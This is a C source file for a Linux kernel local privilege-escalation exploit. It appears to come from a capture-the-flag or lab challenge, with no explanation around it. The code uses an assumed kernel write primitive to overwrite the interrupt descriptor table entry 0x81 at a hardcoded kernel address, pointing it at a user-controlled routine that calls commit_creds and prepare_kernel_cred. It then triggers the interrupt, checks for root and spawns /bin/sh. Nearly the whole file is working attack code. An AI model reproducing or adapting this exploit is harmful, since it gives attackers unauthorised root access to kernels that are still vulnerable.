#include "conf.h"
#include "types.h"


extern void *kread (void *, size_t, bool *);
extern void  kwrite(void *, void *, size_t, bool *); 
extern void  exploit();

// int commit_creds(struct cred *new);
// struct cred *prepare_kernel_cred(struct task_struct *daemon);
int   (*commit_creds)(void *)        = PTR(0xFFFFFFFF81078C30uLL);
void *(*prepare_kernel_cred)(void *) = PTR(0xFFFFFFFF81078F10uLL);

struct gate_struct64 {
    uint16_t offset_low;
    uint16_t segment;
    unsigned int ist : 3;
    unsigned int zero0 : 5;
    unsigned int type : 5;
    unsigned int dpl : 2;
    unsigned int p : 1;
    uint16_t offset_middle;
    uint32_t offset_high;
    uint32_t zero1;
} __attribute__((packed));

typedef struct gate_struct64 gate_desc;


int main() {
    assert(IOVEC_SIZE > 8);
    setvbuf(stdout, NULL, _IONBF, 0);

    bool success;

    // 1. overwrite idt_table[0x81] (interrupt handler of int 0x81)
    gate_desc *payload = malloc(0x10);
    payload->offset_low = (uint64_t)PTR(exploit) & 0xFFFF;
    payload->segment = 0x10;
    payload->ist = 3;
    payload->zero0 = 0;
    payload->type = 0xE;
    payload->dpl = 0x3;
    payload->p = 0x1;
    payload->offset_middle = ((uint64_t)PTR(exploit) >> 16) & 0xFFFF;
    payload->zero1 = 0;

    kwrite(PTR(0xFFFFFFFF81DF6810uLL), payload, 0x10, &success);

    if (!success) {
        puts("[-] Failed to overwrite idt_table[0x81].");
        exit(EXIT_FAILURE);
    }

    // 2. int 0x81
    __asm__ volatile ("int 0x81");

    // 3. check if root
    if (getuid() != 0) {
        puts("[-] Failed to get root.");
        exit(EXIT_FAILURE);
    }

    // 4. restore idt_table[0x81]
    // ...

    // 5. spawn shell
    char *argv[2] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);

    return 0;
}